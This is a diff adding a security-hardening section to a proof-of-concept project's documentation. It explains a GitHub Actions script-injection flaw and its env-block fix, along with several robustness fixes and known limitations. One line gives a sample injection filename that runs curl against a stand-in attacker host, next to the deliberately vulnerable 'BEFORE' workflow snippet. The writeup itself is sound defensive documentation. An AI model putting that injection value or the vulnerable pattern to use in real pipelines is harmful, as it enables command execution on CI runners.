@@ -92,6 +92,56 @@ graph LR
 - **PyYAML** — parsing metadata files
 - **demisto-sdk >=1.38.21** — uploading lists to XSOAR/XSIAM
 
+## Security & Robustness Hardening
+
+A code review identified several issues that were addressed:
+
+### 1. GitHub Actions Script Injection (Security)
+
+The PR validation workflow originally used `${{ }}` interpolation directly inside `run:` commands:
+
+```yaml
+# BEFORE — vulnerable to script injection
+run: python scripts/validate.py ${{ steps.changed.outputs.dirs }}
+```
+
+An attacker could craft filenames under `Lists/` containing shell metacharacters (e.g., `Lists/$(curl attacker.com)/data.json`) that would execute during workflow runs. This is a well-known GitHub Actions anti-pattern.
+
+**Fix:** Moved all `${{ }}` values into `env:` blocks so they're treated as data, not shell code:
+
+```yaml
+# AFTER — safe
+env:
+  CHANGED_DIRS: ${{ steps.changed.outputs.dirs }}
+run: python scripts/validate.py $CHANGED_DIRS
+```
+
+Same treatment applied to `github.base_ref` in the git diff command.
+
+### 2. Metadata Schema Validation (Robustness)
+
+`validate.py` previously used `.get()` with silent defaults for metadata fields. If `type` was missing it fell through to a confusing "Unknown list type ''" error. If `id` or `name` were missing, no error at all.
+
+**Fix:** Added upfront validation of required fields (`id`, `name`, `type`) with a clear error message listing which fields are missing.
+
+### 3. UnicodeDecodeError in Custom Validator (Robustness)
+
+`default.py` reads files as UTF-8 and checks for null bytes to detect binary content. But if the file isn't valid UTF-8 at all, `read_text()` raises an unhandled `UnicodeDecodeError` and the validator crashes instead of reporting a clean failure.
+
+**Fix:** Wrapped the `read_text()` call in a try/except that catches `UnicodeDecodeError` and returns a clear failure message.
+
+### 4. Deploy fetch-depth Assumption (Documentation)
+
+The deploy workflow uses `fetch-depth: 2` so `upload.py` can diff `HEAD~1`. This only works correctly when PRs are squash-merged (one commit per merge). If someone pushes directly to main or the merge strategy changes, the diff could miss files or compare wrong commits.
+
+**Fix:** Added a comment in the workflow documenting this assumption for future maintainers.
+
+### Known Limitations (Acceptable for PoC)
+
+- **Auto-merge bypasses human review** — anyone who can open a PR gets list data merged on validation pass alone. For production, consider requiring approvals via branch protection rules.
+- **No rollback mechanism** — if a deployed list causes issues, there's no automated way to revert. A manual revert commit + re-deploy is needed.
+- **No deployment verification** — the upload step trusts `demisto-sdk`'s exit code but doesn't verify the list is live.
+
 ## Status
 
 > [!info] Proof of Concept
